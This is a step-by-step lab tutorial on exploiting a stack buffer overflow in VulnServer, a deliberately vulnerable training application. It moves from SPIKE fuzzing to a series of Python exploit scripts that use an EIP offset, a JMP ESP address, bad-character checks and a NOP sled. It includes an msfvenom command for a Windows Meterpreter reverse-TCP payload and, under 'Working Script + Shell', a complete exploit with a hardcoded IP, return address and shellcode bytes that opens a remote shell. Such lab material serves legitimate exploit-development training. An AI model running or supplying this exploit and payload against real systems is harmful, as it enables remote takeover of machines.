---
description: 'resource: https://samsclass.info/127/proj/p16-spike.htm'
---

# Buffer Overflow - VulnServer Full Walkthrough

```bash
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");
```

{% embed url="https://www.youtube.com/watch?v=yJF0YPd8lDw&t=20s" %}

## Step 1

Create a .spk script to fuzz the app and crash it.

{% code title="fuzzer.spk" overflow="wrap" lineNumbers="true" %}
```bash
# to read each line of code.
s_readline();
s_string("TRUN "); 
# represent the value of the fuzz data we are sending.
s_string_variable("FUZZ");

# make sure Immunity Debugger is running the VulnServer app.
generic_send_tcp $ip 9999 fuzzer.spk 0 0 # fuzzing the vulnserver app.
# the program crashes (we get an access violation while executing 41414141).

# the 41414141 denotes "AAAA", but at what point or which AAAA index did the program break? What we can do 1st is to know how many A's our fuzzer.spk script sent that crashed the app. How do we do this? In the Register Panel we see the [ESP] value, right click on it, click "follow in dump",
# In the 3rd Panel, we can see where the "/AAAAAA" starts and scrolling down to see where it ends. So we just subtract the start and end addresses with python to get total number of A's sent, for example:
>>> 0x00DDF1F0 - 0x00DDFD98 # in this case 2984
```
{% endcode %}

## Step 2

Generate our own python script to crash the program instead of using spk.

Make sure app is running before executing the script.

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * total_length # 6 - sends 2984 A's to the vulnserver app.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()
```
{% endcode %}

Now we have control over the EIP value, but we dont know where the offset spot that crashes the app is.

Instead of sending AAAAAAA's, we can use Metasploit to create a cyclic pattern of characters using the "msf-pattern-create" and "msf-pattern-offset" to easily find that Offset spot.

<pre class="language-python" data-overflow="wrap" data-line-numbers><code class="lang-python"># in kali terminal.
<strong>msf-pattern-create -h # view help menu.
</strong>msf-pattern-create -l 2984 # creates cyclical random chars, we can copy it, and replace the value at line 16, step 6 in the above python code with the chars.
</code></pre>

```python
# instead of,
 b"A" * total_length # 6 - sends 2984 A's to the vulnserver app.
# it will look like this, we are now sending the generacted chars.
b"................................................."

# We get the EIP value and use the msf-pattern-offset to find the Offset spot.
msf-pattern-offset -l 2984 -q <EIP value>
# it gives us the exact Offset value.
```

Our new Python code will look like this now...

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = b"BBBB" # 11 - this becomes the new EIP value, ie, 42424242.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    b"C" * (total_length - offset - len(new_eip)) # 13 - this is the data/address that gets executed after the EIP ie, ESP. Meaning this is the spot we wil put our shell code, since this is the new ESP value, that points to what the EIP will execute next, ie, our shell code. But in this case we just pass in a bunch of C's to execute for testing purpose.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.
```
{% endcode %}

## Step 3

Making the data do something else.

At this point of controlling the ESP value, we want to make our EIP or Instruction Pointer use some location in the code that tells the program to "JMP" over to the ESP register and execute the code (our reverse shell) thats in that data/address. So we are looking for a "JMP esp" instruction.

We can use mona.py for this. In immunity debugger, type the cmd in the below text entry box.

`!mona jmp -r esp` - looks for jmp esp in the kernel.

Mona displays some results, we can go for the 2nd to the last result since it has "ASCII representation" and all protection values are "false", right click and "copy to clipboard" the address.

Now we can change our "new\_eip" value into that memory address value.

Note this wont work because its a memory address to the binary, meaning we have to convert it to the bytes encoding with the "little endian" format using the python "struct" module.

Our python code will now look like this...

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", 0x<our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    b"C" * (total_length - offset - len(new_eip)) # 13 - this is the data/address that gets executed after the EIP ie, ESP. Meaning this is the spot we wil put our shell code, since this is the new ESP value, that points to what the EIP will execute next, ie, our shell code. But in this case we just pass in a bunch of C's to execute for testing purpose.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 4 - Bad Bytes

Let us figure out all the Bad Bytes that may exist in this app.

We can do this by sending the application all characters (every single potential byte) the program might use.

{% code overflow="wrap" lineNumbers="true" %}
```python
# lets use a list comprehension in python to do this.
# we use the struct module to convert the intergers into unsigned_char, then convert them to byte with ".join".
# we start from range(1,256) in order to remove the "<0x00>" null byte value which in some low level programming language like C, stops the rest of the string from being executed.
all_characters = b"".join([struct.pack('<B', x) for x in range(1,256)])
```
{% endcode %}

Our python code looks like this...

{% code title="" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", 0x<our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger (this is our jmp esp instruction).
all_characters = b"".join([struct.pack('<B', x) for x in range(1,256)]) # 15 - passing all characters to check the app for bad characters.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    all_characters, # 13 - pass in the bad char check.
    b"C" * (total_length - offset - len(new_eip) - len(all_characters)) # 16 - this executes C * the result of the maths operation above.. :). RUN THE CODE. So it gets executed, now from the top at the 1st Panel, rightclick, follow in dump, address. Now we can see 3rd Panel all characters and can now start checking for bad characters (ook for any suspecting outlier or off number). We dont notice any bad character except the null byte.
    
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 5 - NOP\_sled

Since we dont have any bad characters, we can actually remove it from our code.

We want to add some "nops"&#x20;

```python
nop_sled = b"\x90" * 16 
```

Our python code now looks like this...

{% code title="exploit.py" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger (this is our jmp esp instruction).
nop_sled = b"\x90" * 16 # 15 - defining some nops.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">
payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    nop_sled, # 13 - pass in the nop value.
    b"C" * (total_length - offset - len(new_eip) - len(nop_sled)) # 16 - we can run the script and set a breakpoint at the copied memory address value, and we see the nop showing up after the breakpoint which we can fill with our shell code.
    
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Step 6 - Shell code

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=$kaliIP LPORT=4444 -b "\x00" -f py` - this generates our shell code without the bad chars. Copy all, be weary/conscious of your buffer size.

Our new python script now looks like:



{% code title="" overflow="wrap" lineNumbers="true" %}
```python
#!/usr/bin/python
import socket
import struct # 11 - import struct.

# 1 - we establish a connection to the victim pc.
s = socket.socket()
s.connect(("$ip", 9999))

total_length = 2984 # 2 - we will be working with this value.
offset = 2003 # 6 - this is our Offset point/value.
new_eip = struct.pack("<I", <our copied memory address value>) # 14 - this becomes the new EIP value, which executes what the ESP says. We can test this by setting a breakpoint in the debugger (this is our jmp esp instruction).
nop_sled = b"\x90" * 16 # 15 - defining some nops.

# 3 - we use a list to orderly arrange each parts of our payload.
# 4 - in python3, when we are communicating with a socket, we have to send all the data in bytes ie, <b"">

# 17 -  paste shell code here.......
shellcode = buf # 18 - renaming the shell code. We are ging to be placing the shell code after the nops.

payload = [
    b"TRUN /.:/", # 5 - copy the exact value used by .spk script (in the 2nd Panel).
    b"A" * offset, # 10 - sends exactly 2003 A's to the vulnserver app.
    new_eip, # 12 - the new EIP value prints exactly after the 2003 A's, which means we have used up 2003 + 4 out of 2984bytes.
    nop_sled, # 13 - pass in the nop value.
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode) # 16 - we can run the script and set a breakpoint at the copied memory address value, and we see the nop showing up after the breakpoint which we can fill with our shell code.
]
# 7 - putting together our payload/
payload = b"".join(payload) # 8 - joinging the payload with a byte string.

s.send(payload) # 9 - send the payload. 1st RUN HERE.
s.close()


# Restartthe app, then run the script. Now the ESP value becomes CCCCC... just as explained in line 18 step 13. And the EIP value is BBBB.
# We hav full control over the program!.


# Restart program, run it, ctrl+g, enter the <opied memory address value>, f2 to set a breakpoint there. Run the script... we get a notification at the bottom (breakpoint at location .....), f7 to step into (you will notice that we are now executing code off of the stack all inside of our ESP or C buffer) ie We successfully jumped to a location that we can control.
```
{% endcode %}

## Working Script + shell

<details>

<summary>Working Script + Shell</summary>

{% code overflow="wrap" lineNumbers="true" %}
````python
```python
#!/usr/bin/python3.11

import socket
import struct


s = socket.socket()
s.connect(("192.168.0.153", 9999))

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0x62501203)
nop_sled = b"\x90" * 16

buf =  b""
buf += b"\x33\xc9\x83\xe9\xa7\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xde\x95\x15\x35\x83\xee\xfc\xe2\xf4"
buf += b"\x22\x7d\x9a\x35\xde\x95\x75\xbc\x3b\xa4\xc7\x51"
buf += b"\x55\xc7\x25\xbe\x8c\x99\x9e\x67\xca\xa4\xea\xbe"
buf += b"\xac\xbd\x1a\x82\x94\xb3\x24\xf5\x72\xa9\x74\x49"
buf += b"\xdc\xb9\x35\xf4\x11\x98\x14\xf2\x97\xe0\xfa\x67"
buf += b"\x89\x1e\x47\x25\x55\xd7\x29\x34\x0e\x1e\x55\x4d"
buf += b"\x5b\x55\x61\x79\xdf\x45\x45\xbe\x96\x8d\x9e\x6d"
buf += b"\xfe\x94\xc6\xb0\x17\xe1\x29\x04\x21\xdc\x9e\x01"
buf += b"\x55\x94\xc3\x04\x1e\x39\xd4\xfa\xd3\x94\xd2\x0d"
buf += b"\x3e\xe0\xe1\x36\xa3\x6d\x2e\x48\xfa\xe0\xf5\x6d"
buf += b"\x55\xcd\x31\x34\x0d\xf3\x9e\x39\x95\x1e\x4d\x29"
buf += b"\xdf\x46\x9e\x31\x55\x94\xc5\xbc\x9a\xb1\x31\x6e"
buf += b"\x85\xf4\x4c\x6f\x8f\x6a\xf5\x6d\x81\xcf\x9e\x27"
buf += b"\x37\x15\xea\xca\x21\xc8\x7d\x06\xec\x95\x15\x5d"
buf += b"\xa9\xe6\x27\x6a\x8a\xfd\x59\x42\xf8\x92\x9c\xdd"
buf += b"\x21\x45\xad\xa5\xdf\x95\x15\x1c\x1a\xc1\x45\x5d"
buf += b"\xf7\x15\x7e\x35\x21\x40\x7f\x3f\xb6\x55\xbd\x35"
buf += b"\xba\xfd\x17\x35\xcf\xc9\x9c\xd3\x8e\xc5\x45\x65"
buf += b"\x9e\xc5\x55\x65\xb6\x7f\x1a\xea\x3e\x6a\xc0\xa2"
buf += b"\xb4\x85\x43\x62\xb6\x0c\xb0\x41\xbf\x6a\xc0\xb0"
buf += b"\x1e\xe1\x1f\xca\x90\x9d\x60\xd9\x36\xf2\x15\x35"
buf += b"\xde\xff\x15\x5f\xda\xc3\x42\x5d\xdc\x4c\xdd\x6a"
buf += b"\x21\x40\x96\xcd\xde\xeb\x23\xbe\xe8\xff\x55\x5d"
buf += b"\xde\x85\x15\x35\x88\xff\x15\x5d\x86\x31\x46\xd0"
buf += b"\x21\x40\x86\x66\xb4\x95\x43\x66\x89\xfd\x17\xec"
buf += b"\x16\xca\xea\xe0\x5d\x6d\x15\x48\xf6\xcd\x7d\x35"
buf += b"\x9e\x95\x15\x5f\xde\xc5\x7d\x3e\xf1\x9a\x25\xca"
buf += b"\x0b\xc2\x7d\x40\xb0\xd8\x74\xca\x0b\xcb\x4b\xca"
buf += b"\xd2\xb1\x1a\xb0\xae\x6a\xea\xca\x37\x0e\xea\xca"
buf += b"\x21\x94\xd6\x1c\x18\xe0\xd4\xf6\x65\x65\xa0\x97"
buf += b"\x88\xff\x15\x66\x21\x40\x15\x35"

shellcode = buf

payload = [
    b"TRUN /.:/",
    b"A" * offset,
    new_eip,
    nop_sled,
    shellcode,
    b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
]

payload = b"".join(payload)
s.send(payload)

s.close()

```
````
{% endcode %}

</details>

## Step 7&#x20;

Use Metasploit, multi/handler to setup a handler to listen for the connection...

Restart the app, run the app then run the python script...

We get a Meterpreter shell !!

